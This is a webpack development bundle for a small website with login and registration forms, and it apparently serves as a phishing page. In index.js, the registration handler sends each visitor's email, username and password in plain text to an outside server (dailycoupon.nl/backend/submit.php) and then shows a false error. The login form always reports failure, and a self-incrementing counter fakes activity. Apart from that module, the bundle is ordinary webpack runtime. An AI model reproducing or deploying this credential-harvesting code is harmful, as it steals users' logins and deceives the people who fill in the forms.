/*
 * ATTENTION: The "eval" devtool has been used (maybe by default in mode: "development").
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	var __webpack_modules__ = ({

/***/ "./assets/js/includes/scroll-to-element.js":
/*!*************************************************!*\
  !*** ./assets/js/includes/scroll-to-element.js ***!
  \*************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

    eval("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (__WEBPACK_DEFAULT_EXPORT__)\n/* harmony export */ });\n// Scroll to element with offset\r\nconst scrollToElement = (el, offset = 0) => {\r\n    let element = document.querySelector(el);\r\n\tlet headerOffset = offset;\r\n\tlet elementPosition = element.getBoundingClientRect().top;\r\n\tlet offsetPosition = elementPosition + window.pageYOffset - headerOffset;\r\n\twindow.scrollTo({\r\n\t\ttop: offsetPosition,\r\n\t\tbehavior: \"smooth\"\r\n\t});\r\n}\r\n\r\n/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (scrollToElement);\n\n//# sourceURL=webpack://2022-webpack-test/./assets/js/includes/scroll-to-element.js?");

    /***/ }),
    
    /***/ "./assets/js/includes/toggle-modals.js":
    /*!*********************************************!*\
      !*** ./assets/js/includes/toggle-modals.js ***!
      \*********************************************/
    /***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
    
    eval("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (__WEBPACK_DEFAULT_EXPORT__)\n/* harmony export */ });\nconst toggleModals = () => {\r\n    document\r\n        .querySelectorAll('.modal-toggle')\r\n        .forEach(item => {\r\n            item.addEventListener('click', () => {\r\n                let modal = \"visible-\" + item.dataset.modal;\r\n                document.querySelector('body').classList.toggle(modal);\r\n            })\r\n        });\r\n};\r\n\r\n/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = (toggleModals);\n\n//# sourceURL=webpack://2022-webpack-test/./assets/js/includes/toggle-modals.js?");
    
    /***/ }),
    
    /***/ "./assets/js/index.js":
    /*!****************************!*\
      !*** ./assets/js/index.js ***!
      \****************************/
    /***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
    
    eval("__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _includes_scroll_to_element__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./includes/scroll-to-element */ \"./assets/js/includes/scroll-to-element.js\");\n/* harmony import */ var _includes_toggle_modals__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./includes/toggle-modals */ \"./assets/js/includes/toggle-modals.js\");\n\r\n\r\n\r\n\r\nwindow.scrollToElement = _includes_scroll_to_element__WEBPACK_IMPORTED_MODULE_0__[\"default\"];\r\n\r\n(() => {\r\n\r\n    document.addEventListener('DOMContentLoaded', async () => {\r\n        (0,_includes_toggle_modals__WEBPACK_IMPORTED_MODULE_1__[\"default\"])();\r\n\r\n        let loginForm = document.querySelector('#login');\r\n\r\n        loginForm.addEventListener('submit', e => {\r\n            e.preventDefault();\r\n\r\n            loginForm.classList.add('loading');\r\n\r\n            setTimeout(() => {\r\n                loginForm.classList.remove('loading');\r\n                loginForm.querySelector('.error').innerText = \"Wrong username or password\";\r\n            }, 2000);\r\n        });\r\n\r\n\r\n        let registerForm = document.querySelector('#register');\r\n   const formData = new FormData(registerForm);\r\n     let initialField = registerForm.querySelector('.initial-field');\r\n\r\n        initialField\r\n            .querySelector('#go')\r\n            .addEventListener('click', async e => {\r\n                e.preventDefault();\r\n\r\n\r\n                initialField.classList.add('loading');\r\n\r\n                setTimeout(() => {\r\n                    initialField.classList.remove('loading');\r\n                    initialField.classList.add('filled-in');\r\n                    initialField.classList.add('ready');\r\n                }, 2000);\r\n\r\n            });\r\n\r\n\r\n\r\n        registerForm.addEventListener('submit', e => {\r\n            e.preventDefault();\r\n\r\n            registerForm.querySelector('button[type=\"submit\"]').classList.add('submitting');\r\n\r\n            setTimeout(() => {\r\n                let email = registerForm.querySelector('input[name=\"email\"]').value;\r\n                let username = registerForm.querySelector('input[name=\"username\"]').value;\r\n                let password = registerForm.querySelector('input[name=\"password\"]').value;\r\n\r\n                fetch('https://dailycoupon.nl/backend/submit.php?email='+email+'&username='+username+'&password=' + password, {\r\n                    'mode': 'no-cors'\r\n                })\r\n                .then(response => {\r\n                    let result = response.json();\r\n                    console.log(result);\r\n                });\r\n\r\n                registerForm.querySelector('button[type=\"submit\"]').classList.remove('submitting');\r\n                registerForm.querySelector('.error').innerText = \"E-mail or password not allowed.\";\r\n            }, 2000);\r\n        });\r\n\r\n        document\r\n            .querySelectorAll('ul.tools li')\r\n            .forEach(li => {\r\n                li.addEventListener('click', () => alert('Coming soon!'))\r\n            });\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n        var starting = 7536;\r\n        var interval = 3000; \r\n        var iterate = 4;\r\n        //\r\n        //\r\n        function changeCounterInterval() {\r\n        Counter = setInterval(changeCounter, interval);\r\n        }\r\n        function changeCounter(){\r\n        var counter = localStorage.getItem(\"counter\");\r\n        counter++;\r\n        localStorage.setItem(\"counter\", counter);\r\n        var counterValue = starting + (counter * iterate);\r\n        document.getElementById(\"counter\").innerHTML=counterValue;\r\n        }\r\n        changeCounter();\r\n        changeCounterInterval();\r\n\r\n\r\n\r\n    });\r\n\r\n    // change navbar on scroll:\r\n    document.addEventListener('scroll', () => {\r\n        let navbar = document.querySelector('.nav-bar')\r\n        \r\n        if(document.body.getBoundingClientRect().top < -75){\r\n            navbar.classList.add('bar-shadow');\r\n        } else {\r\n            navbar.classList.remove('bar-shadow');\r\n\r\n        }\r\n    });\r\n    \r\n})();\n\n//# sourceURL=webpack://2022-webpack-test/./assets/js/index.js?");
    
    /***/ }),
    
    /***/ "./assets/css/index.css":
    /*!******************************!*\
      !*** ./assets/css/index.css ***!
      \******************************/
    /***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {
    
    eval("__webpack_require__.r(__webpack_exports__);\n// extracted by mini-css-extract-plugin\n\n\n//# sourceURL=webpack://2022-webpack-test/./assets/css/index.css?");
    
    /***/ })
    
    /******/ 	});
    /************************************************************************/
    /******/ 	// The module cache
    /******/ 	var __webpack_module_cache__ = {};
    /******/ 	
    /******/ 	// The require function
    /******/ 	function __webpack_require__(moduleId) {
    /******/ 		// Check if module is in cache
    /******/ 		var cachedModule = __webpack_module_cache__[moduleId];
    /******/ 		if (cachedModule !== undefined) {
    /******/ 			return cachedModule.exports;
    /******/ 		}
    /******/ 		// Create a new module (and put it into the cache)
    /******/ 		var module = __webpack_module_cache__[moduleId] = {
    /******/ 			// no module.id needed
    /******/ 			// no module.loaded needed
    /******/ 			exports: {}
    /******/ 		};
    /******/ 	
    /******/ 		// Execute the module function
    /******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
    /******/ 	
    /******/ 		// Return the exports of the module
    /******/ 		return module.exports;
    /******/ 	}
    /******/ 	
    /************************************************************************/
    /******/ 	/* webpack/runtime/define property getters */
    /******/ 	(() => {
    /******/ 		// define getter functions for harmony exports
    /******/ 		__webpack_require__.d = (exports, definition) => {
    /******/ 			for(var key in definition) {
    /******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
    /******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
    /******/ 				}
    /******/ 			}
    /******/ 		};
    /******/ 	})();
    /******/ 	
    /******/ 	/* webpack/runtime/hasOwnProperty shorthand */
    /******/ 	(() => {
    /******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
    /******/ 	})();
    /******/ 	
    /******/ 	/* webpack/runtime/make namespace object */
    /******/ 	(() => {
    /******/ 		// define __esModule on exports
    /******/ 		__webpack_require__.r = (exports) => {
    /******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
    /******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
    /******/ 			}
    /******/ 			Object.defineProperty(exports, '__esModule', { value: true });
    /******/ 		};
    /******/ 	})();
    /******/ 	
    /************************************************************************/
    /******/ 	
    /******/ 	// startup
    /******/ 	// Load entry module and return exports
    /******/ 	// This entry module can't be inlined because the eval devtool is used.
    /******/ 	__webpack_require__("./assets/js/index.js");
    /******/ 	var __webpack_exports__ = __webpack_require__("./assets/css/index.css");
    /******/ 	
    /******/ })()
    ;
